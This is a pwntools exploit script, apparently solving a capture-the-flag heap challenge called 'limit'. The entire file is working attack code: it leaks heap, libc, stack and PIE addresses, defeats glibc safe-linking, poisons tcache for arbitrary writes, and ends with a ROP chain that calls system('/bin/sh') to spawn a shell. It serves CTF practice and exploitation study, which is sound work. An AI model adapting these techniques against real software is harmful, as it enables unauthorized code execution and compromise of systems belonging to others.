#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./limit")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gdbscript = f"""
	set solib-search-path {Path.cwd()}
	set $libc=0x7ffff7dd5000
	set $stack=0x7ffffffdd000
	set $pie=0x555555554000
	b main
	c
	brva 0x16ca
	b *_exit
	c
"""
def conn():
	if args.REMOTE:
		#p = remote("addr", args.PORT)
		#p = remote(args.HOST, args.PORT)
		p = remote("localhost", 5000)
	elif args.GDB:
		p = gdb.debug([elf.path], gdbscript=gdbscript, aslr=args.ASLR)
		log.info("gdbscript: " + gdbscript)
	else:
		p = process([elf.path])
	return p

p = conn()

# solve or else

if not "main_arena" in libc.sym:
	libc.sym["main_arena"] = 0x219c80

def recvregex(regex_string):
	ret_regex = p.recvregex(regex_string, capture=True)
	if ret_regex:
		if ret_regex.lastindex > 1:
			return ret_regex.groups()
		return ret_regex.group(1)
	return None
def to_int(s):
	try: return int(s, 0)
	except: pass
	try: return u64(s.ljust(8, b'\0'))
	except: pass

def option(op):
	p.sendlineafter(b"> ", op)
def malloc(idx, sz):
	option(b"1")
	p.sendlineafter(b"Index: ", str(idx).encode())
	p.sendlineafter(b"Size: ", str(sz).encode())
def free(idx):
	option(b"2")
	p.sendlineafter(b"Index: ", str(idx).encode())
def puts(idx):
	option(b"3")
	p.sendlineafter(b"Index: ", str(idx).encode())
	p.recvuntil(b"Data: ")
	return p.recvuntil(b"\n\nOptions:", drop=True)
def read(idx, buf, nl=True):
	option(b"4")
	p.sendlineafter(b"Index: ", str(idx).encode())
	if nl: buf += b'\n'
	p.sendafter(b"Data: ", buf)

malloc(0, 0xe8)
free(0)
malloc(0, 0xe8)
heap_base = to_int(puts(0)) << 3*0x4
log.info(f"heap: {heap_base:#x}")
first_chunk = heap_base + 0xb30
safe_linking = first_chunk >> 3*0x4
def fix(ptr, sl=safe_linking):
	return ptr^sl

for i in range(1, 9):
	malloc(i, 0xe8)
malloc(9, 1)
for i in range(9):
	free(i)
for i in range(9):
	malloc(i, 0xe8)
libc.address = to_int(puts(7)) - (libc.sym.main_arena+560)
log.info(f"libc: {libc.address:#x}")

malloc(0, 0x38)
c0_ow = flat([
	0,
	0x60,
	first_chunk,
	first_chunk,
])
read(0, c0_ow)
malloc(1, 0x28)
malloc(2, 0xf8)
c1_ow = flat([
	cyclic(0x20),
	0x60,
])
read(1, c1_ow, False)
for i in range(7):
	malloc(i+8, 0xf8)
for i in range(7):
	free(i+8)
free(2)
malloc(3, 0x38)
malloc(4, 0x28)
free(4)
free(1)
c3_ow = flat([
	p64(0)*6,
	fix(heap_base+0x90)
])
read(3, c3_ow)
malloc(4, 0x28)
malloc(1, 0x28)

malloc(3, 0x18)
malloc(9, 0x18)
free(9)
malloc(9, 0x28)
free(9)
c1_ow = flat([
	libc.sym.__libc_argv,
	first_chunk+0x80,
])
read(1, c1_ow)

malloc(2, 0x18)
free(3)
malloc(2, 0x28)
stack_leak = fix(fix(to_int(puts(2))), libc.sym.__libc_argv >> 3*0x4)
log.info(f"stack leak: {stack_leak:#x}")
pie_leak_addr = stack_leak - 0x48
ret_addr = stack_leak - 0x170
free(2)

malloc(3, 0x18)
malloc(9, 0x28)
free(9)
c1_ow = flat([
	pie_leak_addr,
	first_chunk+0x80,
])
read(1, c1_ow)
malloc(2, 0x18)
free(3)
malloc(2, 0x28)
elf.address = fix(fix(to_int(puts(2))), pie_leak_addr >> 3*0x4) - elf.sym._start
log.info(f"pie: {elf.address:#x}")

malloc(9, 0x48)
free(9)
malloc(9, 0x58)
free(9)
c1_ow = flat([
	p64(0)*3,
	elf.sym.sizes+4*0x4,
	elf.sym.chunks+4*0x8,
])
read(1, c1_ow)
malloc(2, 0x58)
malloc(3, 0x48)
read(2, p64(ret_addr))
read(3, p64(0x100))

rop = ROP(libc)
poprdi = rop.rdi.address
ret = rop.ret.address
binsh = next(libc.search(b"/bin/sh"))
payload = flat([
	poprdi, binsh,
	ret,
	libc.sym.system,
])
read(4, payload)

p.interactive()
